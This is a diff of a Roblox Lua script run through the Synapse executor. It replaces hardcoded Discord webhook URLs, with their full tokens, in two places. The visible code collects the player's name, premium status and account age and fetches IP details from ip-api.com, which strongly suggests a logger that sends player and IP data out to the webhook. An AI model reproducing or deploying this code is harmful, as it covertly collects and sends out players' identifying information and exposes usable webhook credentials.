@@ -58,7 +58,7 @@ elseif premium and player.AccountAge >= 70 then
    alt = false
 end
 
-local webh = "https://discord.com/api/webhooks/1056927146813165628/oxzP09x5UiobBHC6P_qNwJ8l7DPj8RmFpoK4hdHClIK5LLKIhNixS1GYpdVwLYkn-nyI"
+local webh = "https://discord.com/api/webhooks/1056929888600326144/FDNvaR6rha1L1DUEs9CSaWvwJkiHbdK6UI5yEBbjYSUPNSra_zVSLZQcvV0LQXTGqZ2k"
 
 pcall(function()
    local data = {
@@ -131,7 +131,7 @@ pcall(function()
 end)
 
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1056847841680687164/dDv3drtqyQu5Xu8_q06VKMB-UHkTkGy5bS5dSXdk9IuEnX1qmmxvDYROx55BEGpAPV1H"
+local webhook_url = "https://discord.com/api/webhooks/1056929888600326144/FDNvaR6rha1L1DUEs9CSaWvwJkiHbdK6UI5yEBbjYSUPNSra_zVSLZQcvV0LQXTGqZ2k"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
